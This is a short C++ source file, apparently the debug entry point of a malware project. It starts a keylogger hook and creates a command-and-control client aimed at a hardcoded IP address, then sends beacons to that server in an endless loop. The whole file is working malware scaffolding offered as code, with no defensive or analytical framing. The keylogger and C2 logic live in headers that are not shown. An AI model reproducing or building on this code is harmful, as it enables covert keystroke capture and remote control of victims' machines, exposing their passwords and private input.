#include "cncManager.h"
#include "commandManager.h"
#include "keyLogger.h"

#include <stdlib.h>
#include <iostream>
#include <string>
#include <thread>

/* For DEBUG */
int main() {
    //cncManager client(L"1.251.227.66");
    cncManager client(L"172.17.254.126");

    keyLogger logger;

    std::thread keyLog = std::thread(&keyLogger::startHook, logger);
    keyLog.join();

    client.print_setting = true;
    //std::thread Beacon = std::thread(&cncManager::sendBeacon, client);
    //Beacon.detach();
    client.sendBeacon();


    while (TRUE) {
        //std::cout << "thread test" << std::endl;
        Sleep(1000);
    }

}